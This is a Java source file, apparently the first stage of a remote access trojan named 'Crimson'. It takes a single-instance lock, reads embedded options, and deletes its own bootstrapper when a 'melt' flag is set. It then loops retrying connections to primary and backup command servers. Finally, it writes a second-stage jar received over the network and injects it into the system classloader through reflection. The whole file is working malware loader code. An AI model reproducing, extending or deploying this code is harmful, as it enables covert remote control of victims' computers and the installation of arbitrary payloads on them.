package subterranean.crimson.permajar.stage1;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Scanner;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.universal.FileLocking;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.AddressSpec;
import subterranean.crimson.universal.containers.Options;
import subterranean.crimson.universal.objects.InvalidObjectException;
import subterranean.crimson.universal.objects.ObjectTransfer;

public class Stage1 {

	public static Options options;

	public static void run(String[] arguments) {
		if (FileLocking.lockExists()) {
			// stop
			return;
		} else {
			FileLocking.lock();

		}

		// Load options from internal text file
		loadOptions();

		// Delete bootstrapper if needed
		if (options.melt) {
			if (arguments.length != 0) {
				(new File(arguments[0])).delete();
			}
		}

		connectionRoutine();

	}

	public static void connectionRoutine() {
		// Establish a network connection
		long connectionAttempts = 0;

		while (true) {
			AddressSpec serverAddress = null;
			int port = 0;
			if (!options.crimsonDNS) {
				if (connectionAttempts % 2 == 1) {
					if (options.backupAddress != null) {
						serverAddress = options.backupAddress;
						port = options.backupPort.getPort();
					} else {
						serverAddress = options.primaryAddress;
						port = options.primaryPort.getPort();
					}

				} else {
					serverAddress = options.primaryAddress;
					port = options.primaryPort.getPort();
				}

			} else {
				// using CrimsonDNS. query the server TODO
				HashMap<String, String> params = new HashMap<String, String>();
				params.put("name", "GETCDADDRESS");
				params.put("username", options.crimsonDNS_user);
				params.put("password", options.crimsonDNS_hash);
				serverAddress = new AddressSpec("");
			}

			if (!Communications.connect(serverAddress.getIPAddress(), port, options.ssl)) {
				connectionAttempts++;
				// connection was unsuccessful
				try {
					Thread.sleep(options.connectPeriod);
				} catch (InterruptedException e) {

				}
				continue;

			} else {
				// connection was successful
				break;
			}

		}

	}

	public static void loadOptions() {

		InputStream in = Stage1.class.getResourceAsStream("/subterranean/crimson/options");
		if (in == null) {
			// the options file was not found
			return;
		}
		Scanner s = new Scanner(in);
		Options o = null;
		if (!s.hasNextLine()) {
			// empty options file
			// error
		} else {
			try {
				o = (Options) ObjectTransfer.fromString(s.nextLine(), false);

			} catch (InvalidObjectException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
		s.close();
		options = o;
	}

	public static void _loadStage2() {
		Logger.add("Loading Stage2");

		String pathToJar = "stage2.jar";
		// load
		try {
			JarFile jarFile = new JarFile(pathToJar);
			Enumeration e = jarFile.entries();

			URL[] urls = { new URL("jar:file:" + pathToJar + "!/") };
			URLClassLoader cl = new URLClassLoader(urls);

			while (e.hasMoreElements()) {
				JarEntry je = (JarEntry) e.nextElement();
				if (je.isDirectory() || !je.getName().endsWith(".class")) {
					continue;
				}
				// -6 because of .class
				String className = je.getName().substring(0, je.getName().length() - 6);
				className = className.replace('/', '.');
				try {
					Class c = cl.loadClass(className);
				} catch (Throwable e1) {
					// forget it
					Logger.add("Couldnt load: " + je.getName());
				}

			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void loadStage2() {

		try {
			addURL((new File("stage2.jar")).toURI().toURL());
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Logger.add("Loaded Stage2");
	}

	public static void installStage2(byte[] s2) {
		Logger.add("Writing Stage2 Jar");
		Utilities.write(s2, "stage2.jar");
		loadStage2();
	}

	public static void addURL(URL u) {

		URLClassLoader sysloader = (URLClassLoader) ClassLoader.getSystemClassLoader();
		Class sysclass = URLClassLoader.class;

		try {
			Method method = sysclass.getDeclaredMethod("addURL", new Class[] { URL.class });
			method.setAccessible(true);
			method.invoke(sysloader, new Object[] { u });
		} catch (Throwable t) {
			t.printStackTrace();
		}// end try catch

	}// end method

}
